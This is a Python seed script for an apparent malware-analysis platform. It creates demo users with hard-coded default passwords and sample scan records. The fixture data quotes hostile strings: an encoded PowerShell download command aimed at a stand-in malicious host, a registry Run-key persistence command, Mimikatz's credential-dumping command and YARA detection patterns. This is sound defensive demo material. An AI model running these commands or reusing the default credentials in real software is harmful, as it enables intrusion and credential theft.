import logging
from sqlalchemy.orm import Session

from app.db.session import SessionLocal, init_database
from app.models.user import User, RoleEnum
from app.models.scan import File, AnalysisResult, YARAResult
from app.core.security import hash_password

logger = logging.getLogger(__name__)

# Default demo users to seed for instant testing & development
SEED_USERS = [
    {
        "email": "admin@threatlens.ai",
        "username": "admin",
        "full_name": "Platform Administrator",
        "password": "AdminPassword123!",
        "role": RoleEnum.ADMINISTRATOR,
    },
    {
        "email": "analyst@threatlens.ai",
        "username": "analyst_sarah",
        "full_name": "Sarah Connor (Security Analyst)",
        "password": "AnalystPassword123!",
        "role": RoleEnum.SECURITY_ANALYST,
    },
    {
        "email": "soc@threatlens.ai",
        "username": "soc_alex",
        "full_name": "Alex Mercer (SOC Analyst)",
        "password": "SocPassword123!",
        "role": RoleEnum.SOC_TEAM,
    },
    {
        "email": "researcher@threatlens.ai",
        "username": "researcher_elena",
        "full_name": "Dr. Elena Rostova (Malware Researcher)",
        "password": "ResearcherPassword123!",
        "role": RoleEnum.RESEARCHER,
    },
]


def seed_default_users(db: Session) -> None:
    """Seed default accounts for each role if they don't already exist."""
    for user_data in SEED_USERS:
        existing_user = db.query(User).filter(
            (User.email == user_data["email"]) | (User.username == user_data["username"])
        ).first()

        if not existing_user:
            user = User(
                email=user_data["email"],
                username=user_data["username"],
                full_name=user_data["full_name"],
                hashed_password=hash_password(user_data["password"]),
                role=user_data["role"],
                is_active=True,
            )
            db.add(user)
            logger.info(f"Seeded user: {user.username} ({user.role.value})")
    
    db.commit()


def seed_sample_scans(db: Session) -> None:
    """Seed realistic malware scan and analysis results if files table is empty."""
    if db.query(File).count() == 0:
        analyst_user = db.query(User).filter(User.username == "analyst_sarah").first()
        user_id = analyst_user.id if analyst_user else None

        # Seed sample files
        file1 = File(
            user_id=user_id,
            filename="invoice.exe",
            file_path="uploads/invoice.exe",
            file_size=245800,
            md5_hash="5d41402abc4b2a76b9719d911017c592",
            sha256_hash="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            file_type="PE32 Executable (GUI) Intel 80386, for MS Windows",
            status="completed"
        )
        file2 = File(
            user_id=user_id,
            filename="payload_sample.dll",
            file_path="uploads/payload_sample.dll",
            file_size=1048576,
            md5_hash="098f6bcd4621d373cade4e832627b4f6",
            sha256_hash="9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
            file_type="PE32+ Executable DLL (console) x86-64, for MS Windows",
            status="completed"
        )
        file3 = File(
            user_id=user_id,
            filename="quarterly_report.pdf",
            file_path="uploads/quarterly_report.pdf",
            file_size=512000,
            md5_hash="1b3231655cebb7a1f783eddf27d254ca",
            sha256_hash="2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae",
            file_type="PDF document, version 1.7",
            status="completed"
        )

        db.add_all([file1, file2, file3])
        db.commit()

        # Add Analysis & YARA Results for invoice.exe (High Risk Trojan sample)
        analysis1 = AnalysisResult(
            file_id=file1.id,
            pe_headers={
                "entry_point": "0x00401000",
                "number_of_sections": 5,
                "sections": [".text", ".rdata", ".data", ".rsrc", ".reloc"],
                "subsystem": "Windows GUI",
                "image_base": "0x00400000",
                "compile_timestamp": "2026-03-14 10:22:15"
            },
            extracted_strings=[
                "powershell.exe -ExecutionPolicy Bypass -W Hidden -enc aHR0cHM6Ly9tYWxpY2lvdXMtc2l0ZS5jb20vcGF5bG9hZC5wc2E=",
                "cmd.exe /c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MalUpdate",
                "WScript.Shell",
                "CreateProcessA",
                "VirtualAllocEx",
                "WriteProcessMemory"
            ],
            suspicious_apis=[
                "Kernel32.dll -> VirtualAlloc",
                "Kernel32.dll -> WriteProcessMemory",
                "Kernel32.dll -> CreateRemoteThread",
                "Advapi32.dll -> RegSetValueExA",
                "Urlmon.dll -> URLDownloadToFileA"
            ],
            network_indicators={
                "urls": ["http://malicious-site.com/payload.ps1", "https://command-and-control-server.xyz/gate.php"],
                "ips": ["185.220.101.5", "192.0.2.14"]
            },
            risk_score=82,
            threat_classification="Potential Trojan Malware",
            recommended_action="Escalate to Security Analyst for Investigation"
        )

        yara1 = YARAResult(
            file_id=file1.id,
            rule_name="Suspicious_PowerShell_Execution",
            severity="high",
            tags=["trojan", "downloader", "powershell"],
            matched_strings=["$s1 = powershell.exe -ExecutionPolicy Bypass", "$s2 = URLDownloadToFileA"]
        )
        yara2 = YARAResult(
            file_id=file1.id,
            rule_name="Persistence_Registry_Modification",
            severity="medium",
            tags=["persistence", "registry"],
            matched_strings=["$reg = Software\\Microsoft\\Windows\\CurrentVersion\\Run"]
        )

        # Add Analysis for payload_sample.dll (Critical Risk Mimikatz sample)
        analysis2 = AnalysisResult(
            file_id=file2.id,
            pe_headers={
                "entry_point": "0x10001200",
                "number_of_sections": 4,
                "sections": [".text", ".data", ".rsrc", ".reloc"],
                "subsystem": "Windows DLL"
            },
            extracted_strings=["mimikatz", "sekurlsa::logonpasswords", "lsass.exe"],
            suspicious_apis=["Kernel32.dll -> OpenProcess", "Advapi32.dll -> AdjustTokenPrivileges"],
            network_indicators={"urls": [], "ips": ["103.253.144.10"]},
            risk_score=95,
            threat_classification="Credential Stealer / Mimikatz Variant",
            recommended_action="Quarantine Immediately & Alert Incident Response Team"
        )

        yara3 = YARAResult(
            file_id=file2.id,
            rule_name="Mimikatz_Credential_Dump",
            severity="critical",
            tags=["credential_dump", "mimikatz"],
            matched_strings=["$str1 = sekurlsa::logonpasswords"]
        )

        # Add Analysis for clean_document.pdf (Clean File)
        analysis3 = AnalysisResult(
            file_id=file3.id,
            pe_headers=None,
            extracted_strings=["Quarterly Security Assessment Report", "Table of Contents", "Conclusion"],
            suspicious_apis=[],
            network_indicators={"urls": [], "ips": []},
            risk_score=5,
            threat_classification="Benign Clean Document",
            recommended_action="No Action Required"
        )

        db.add_all([analysis1, yara1, yara2, analysis2, yara3, analysis3])
        db.commit()
        logger.info("Sample database scan records seeded successfully.")


def setup_initial_data() -> None:
    """Initialize DB schema and seed initial test accounts and sample scans."""
    init_database()
    db = SessionLocal()
    try:
        seed_default_users(db)
        seed_sample_scans(db)
    finally:
        db.close()


init_db = setup_initial_data


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    setup_initial_data()
    print("Database initialized and seeded successfully.")
